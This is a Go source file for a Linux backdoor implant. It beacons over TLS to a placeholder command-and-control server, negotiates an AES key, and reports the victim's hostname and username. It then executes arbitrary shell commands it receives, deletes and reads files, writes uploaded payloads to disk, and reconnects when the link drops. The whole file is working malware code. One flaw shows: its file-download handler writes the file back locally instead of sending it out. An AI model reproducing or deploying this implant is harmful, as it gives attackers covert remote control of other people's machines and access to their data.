//go:build linux

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const C2Host = "IP_do_Server"
const C2Port = "443"

func connectDirect(host, port string) (net.Conn, error) {
	conf := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", host+":"+port, conf)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func encryptAES(key []byte, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decryptAES(key []byte, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext curto")
	}
	nonce, cipherdata := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, cipherdata, nil)
}

func executeLinuxCommand(cmdStr string, currentDir string) (string, string) {
	parts := strings.Fields(cmdStr)
	if len(parts) == 0 {
		return "", currentDir
	}
	action := strings.ToLower(parts[0])

	switch action {
	case "pwd":
		cwd, _ := os.Getwd()
		return cwd, cwd
	case "cd":
		if len(parts) < 2 {
			cwd, _ := os.Getwd()
			return cwd, cwd
		}
		target := parts[1]
		if !filepath.IsAbs(target) {
			target = filepath.Join(currentDir, target)
		}
		os.Chdir(target)
		cwd, _ := os.Getwd()
		return cwd, cwd
	case "ls", "dir":
		files, _ := os.ReadDir(currentDir)
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("\nDirectory of %s:\n\n", currentDir))
		for _, f := range files {
			info, _ := f.Info()
			sb.WriteString(fmt.Sprintf("%s  %10d  %s\n", info.Mode(), info.Size(), f.Name()))
		}
		return sb.String(), currentDir
	case "cat":
		if len(parts) < 2 {
			return "Uso: cat <arq>", currentDir
		}
		p := parts[1]
		if !filepath.IsAbs(p) {
			p = filepath.Join(currentDir, p)
		}
		c, err := os.ReadFile(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return string(c), currentDir
	case "rm":
		if len(parts) < 2 {
			return "Uso: rm <arq>", currentDir
		}
		p := parts[1]
		if !filepath.IsAbs(p) {
			p = filepath.Join(currentDir, p)
		}
		err := os.Remove(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return "Removido.", currentDir
	case "hostname":
		h, _ := os.Hostname()
		return fmt.Sprintf("[+] Hostname: %s", h), currentDir
	case "whoami":
		out, _ := exec.Command("whoami").CombinedOutput()
		return strings.TrimSpace(string(out)), currentDir
	case "id":
		out, _ := exec.Command("id").CombinedOutput()
		return strings.TrimSpace(string(out)), currentDir
	case "exec", "run":
		if len(parts) < 2 {
			return "Uso: exec <cmd>", currentDir
		}
		fullCmd := strings.TrimSpace(strings.TrimPrefix(cmdStr, parts[0]))
		cmd := exec.Command("sh", "-c", fullCmd)
		cmd.Dir = currentDir
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("[-] Erro: %v\n%s", err, string(out)), currentDir
		}
		return string(out), currentDir
	case "download":
		if len(parts) < 2 {
			return "Uso: download <arq>", currentDir
		}
		p := parts[1]
		b, err := os.ReadFile(p)
		if err != nil {
			return err.Error(), currentDir
		}
		return fmt.Sprintf("[FILE_DOWNLOAD_DATA]|%s|%s", filepath.Base(p), base64.StdEncoding.EncodeToString(b)), currentDir
	default:
		cmd := exec.Command("sh", "-c", cmdStr)
		cmd.Dir = currentDir
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("[-] Comando não reconhecido ou erro: %v\n%s", err, string(out)), currentDir
		}
		return string(out), currentDir
	}
}

func sendPacket(conn net.Conn, key []byte, data []byte) {
	cipherData, err := encryptAES(key, data)
	if err != nil {
		return
	}
	l := uint32(len(cipherData))
	header := []byte{byte(l >> 24), byte(l >> 16), byte(l >> 8), byte(l)}
	conn.Write(header)
	conn.Write(cipherData)
}

func main() {
	hostname, _ := os.Hostname()
	currentUser := os.Getenv("USER")
	infoMap := map[string]interface{}{
		"hostname": hostname,
		"username": currentUser,
		"os":       "Linux",
	}
	infoBytes, _ := json.Marshal(infoMap)
	currentDir, _ := os.Getwd()

	for {
		conn, err := connectDirect(C2Host, C2Port)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		privKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			conn.Close()
			continue
		}
		pubKeyBytes := elliptic.Marshal(elliptic.P256(), privKey.PublicKey.X, privKey.PublicKey.Y)
		conn.Write(pubKeyBytes)

		pubBuf := make([]byte, 1024)
		n, err := conn.Read(pubBuf)
		if err != nil {
			conn.Close()
			continue
		}
		srvX, srvY := elliptic.Unmarshal(elliptic.P256(), pubBuf[:n])
		if srvX == nil {
			conn.Close()
			continue
		}

		x, _ := elliptic.P256().ScalarMult(srvX, srvY, privKey.D.Bytes())
		aesKey := x.Bytes()
		if len(aesKey) > 32 {
			aesKey = aesKey[len(aesKey)-32:]
		} else if len(aesKey) < 32 {
			padded := make([]byte, 32)
			copy(padded[32-len(aesKey):], aesKey)
			aesKey = padded
		}

		encMeta, _ := encryptAES(aesKey, infoBytes)
		metaLen := uint32(len(encMeta))
		conn.Write([]byte{byte(metaLen >> 24), byte(metaLen >> 16), byte(metaLen >> 8), byte(metaLen)})
		conn.Write(encMeta)

		go func(c net.Conn, key []byte) {
			for {
				time.Sleep(15 * time.Second)
				sendPacket(c, key, []byte("[ping]"))
			}
		}(conn, aesKey)

		for {
			lenHeader := make([]byte, 4)
			_, err := io.ReadFull(conn, lenHeader)
			if err != nil {
				break
			}
			packetLen := uint32(lenHeader[0])<<24 | uint32(lenHeader[1])<<16 | uint32(lenHeader[2])<<8 | uint32(lenHeader[3])
			packetBytes := make([]byte, packetLen)
			_, err = io.ReadFull(conn, packetBytes)
			if err != nil {
				break
			}

			plainCmd, err := decryptAES(aesKey, packetBytes)
			if err != nil {
				continue
			}

			cmdStr := strings.TrimSpace(string(plainCmd))
			if cmdStr == "[ping]" {
				continue
			}
			if cmdStr == "[kill]" {
				conn.Close()
				os.Exit(0)
			}

			if strings.HasPrefix(cmdStr, "upload_payload ") {
				var args map[string]string
				if err := json.Unmarshal([]byte(strings.TrimPrefix(cmdStr, "upload_payload ")), &args); err == nil {
					remotePath := args["path"]
					fileData, _ := base64.StdEncoding.DecodeString(args["data"])
					os.MkdirAll(filepath.Dir(remotePath), 0755)
					os.WriteFile(remotePath, fileData, 0644)
					sendPacket(conn, aesKey, []byte("[+] Upload concluído."))
				}
				continue
			}

			output, newDir := executeLinuxCommand(cmdStr, currentDir)
			currentDir = newDir

			if strings.HasPrefix(output, "[FILE_DOWNLOAD_DATA]|") {
				parts := strings.SplitN(output, "|", 3)
				fileBytes, err := base64.StdEncoding.DecodeString(parts[2])
				if err == nil {
					os.WriteFile(filepath.Join(".", parts[1]), fileBytes, 0644)
				}
				output = "[+] Arquivo baixado com sucesso."
			}

			if output == "" {
				output = "[comando executado sem saída]"
			}
			sendPacket(conn, aesKey, []byte(output))
		}
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
